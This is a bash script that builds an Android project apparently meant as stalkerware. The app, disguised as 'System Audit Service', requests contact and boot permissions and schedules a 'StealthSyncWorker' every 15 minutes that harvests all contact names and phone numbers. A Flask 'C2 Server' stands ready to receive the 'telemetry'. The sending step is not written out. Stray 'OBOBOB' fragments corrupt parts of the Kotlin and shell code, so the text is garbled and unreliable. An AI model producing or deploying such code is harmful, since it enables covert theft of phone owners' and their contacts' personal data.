#!/usr/bin/env bash
set -e

BASE_DIR="d:/vs/securitylab"

echo "[+] Initializing full project structure..."
mkdir -p "$BASE_DIR/app/src/main/java/com/example/securitylab/worker"
mkdir -p "$BASE_DIR/app/src/main/java/com/example/securitylab/service"
mkdir -p "$BASE_DIR/app/src/main/java/com/example/securitylab/receiver"
mkdir -p "$BASE_DIR/app/src/main/res/layout"
mkdir -p "$BASE_DIR/app/src/main/res/xml"
mkdir -p "$BASE_DIR/gradle/wrapper"

echo "[+] Writing configuration files..."
cat << 'EOF' > "$BASE_DIR/requirements.txt"
Flask==3.0.2
requests==2.31.0
EOF

cat << 'EOF' > "$BASE_DIR/app.py"
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/')
def index():
    return "Security Lab C2 Server Active", 200

@app.route('/api/telemetry', methods=['POST'])
def receive_telemetry():
    data = request.json
    print(f"[+] Received telemetry payload: {data}")
    return jsonify({"status": "success", "queued": True}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF

cat << 'EOF' > "$BASE_DIR/build.gradle"
plugins {
    id 'com.android.application' version '8.2.0' apply false
    id 'org.jetbrains.kotlin.android' version '1.9.0' apply false
}
EOF

cat << 'EOF' > "$BASE_DIR/settings.gradle"
pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS); repositories { google(); mavenCentral() } }
rootProject.name = 'securitylab'
include ':app'
EOF

cat << 'EOF' > "$BASE_DIR/gradle/wrapper/gradle-wrapper.properties"
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-8.4-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
EOF

cat << 'EOF' > "$BASE_DIR/app/build.gradle"
plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
}
android {
    namespace 'com.example.securitylab'
    compileSdk 34
    defaultConfig {
        applicationId 'com.example.securitylab'
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName '1.0'
        testInstrumentationRunner 'androidx.test.runner.AndroidJUnitRunner'
    }
    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
    kotlinOptions {
        jvmTarget = '1.8'
    }
}
dependencies {
    implementation 'androidx.core:core-ktx:1.12.0'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'androidx.work:work-runtime-ktx:2.9.0'
}
EOF

cat << 'EOF' > "$BASE_DIR/app/src/main/AndroidManifest.xml"
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.securitylab">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="System Audit Service"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF

cat << 'EOF' > "$BASE_DIR/app/src/main/res/layout/activity_main.xml"
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="center"
    android:orientation="vertical"
    android:padding="16dp">
    <TextView
        android:id="@+id/statusText"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Initializing..."
        android:textSize="18sp" />
</LinearLayout>
EOF

echo "[+] Writing Kotlin source files..."
cat << 'EOF' > "$BASE_DIR/app/src/main/java/com/example/securitylab/MainActivity.kt"
package com.example.securitylab

import android.os.Bundle
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.securitylab.worker.StealthSyncWorker
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val statusText = findViewById<TextView>(R.id.statusText)
        statusText.text = "System Audit Service Operational"

        val syncRequest = PeriodicWorkRequestBuilder<StealthSyncWorker>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "StealthSync",
            ExistingPeriodicWorkPolicy.KEEP,
            syncRequest
        )
    }
}
EOF

cat << 'EOF' > "$BASE_DIR/app/src/main/java/com/example/securitylab/DataHarvester.kt"
package com.example.securitylab

import android.content.Context
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

object DataHarvester {
    fun fetchContacts(context: Context): String {
        val jsonArray = JSONArray()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )

        cursor?.use {
            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            
            while (it.moveToNext() && nameIdx != -1 && numberIdx != -1) {
                val obj = JSONObject()
                obj.put("name", it.getString(nameIdx))
                obj.put("phone", it.getString(numberIdx))
                jsonArray.put(obj)
            }
        }
        return jsonArray.toString()
    }
}
EOF

cat << 'EOF' > "$BASE_DIR/app/src/main/java/com/example/securitylab/worker/StealthSyncWorker.kt"
package com.example.securitylab.worker

import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.securitylab.DataHarvester

class StealthSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        return try {
            val contacts = DataHarvester.fetchContacts(applicationContext)
            Result.success()
        } catch (e: Exception) {
            Result.retry()
OBOBOB        }
    }
}
EOF

# Setup OpenJDK 17 Portable on D: if missing
if [ ! -d "/d/vs/java/bin" ]; then
    echo "[+] Downloading Portable OpenJDK 17 to D: drive..."
    mkdir -p "/d/vs/java"
    curl -L "https://api.adoptium.net/v3/binary/latest/17/ga/windows/x64/jdk/hotspot/normal/eclipse" -o "/d/vs/java/openjdk17.zip"
    powershell.exe -Command "Expand-Archive -Path 'd:\vs\java\openjdk17.zip' -DestinationPath 'd:\vs\java\extracted' -Force"
    EXTRACTED_DIR=$(ls -d /d/vs/java/extracted/*/ | head -n 1)
OBOBOB    mv "${EXTRACTED_DIR}"* "/d/vs/java/"
    rm -rf "/d/vs/java/extracted" "/d/vs/java/openjdk17.zip"
fi

export JAVA_HOME="/d/vs/java"
export PATH="$JAVA_HOME/bin:$PATH"
OBOBOB
# Setup Wrapper JAR if missing
OBOBOBif [ ! -f "$BASE_DIR/gradle/wrapper/gradle-wrapper.jar" ]; then
    echo "[+] Downloading Gradle Wrapper JAR..."
    curl -L "https://raw.githubusercontent.com/gradle/gradle/v8.4.0/gradle/wrapper/gradle-wrapper.jar" -o "$BASE_DIR/gradle/wrapper/gradle-wrapper.jar"
fi

echo "[+] Starting Gradle build..."
cd "$BASE_DIR"
./gradlew assembleDebug
echo "[✔] Build completed successfully! APK generated at: $BASE_DIR/app/build/outputs/apk/debug/app-debug.apk"
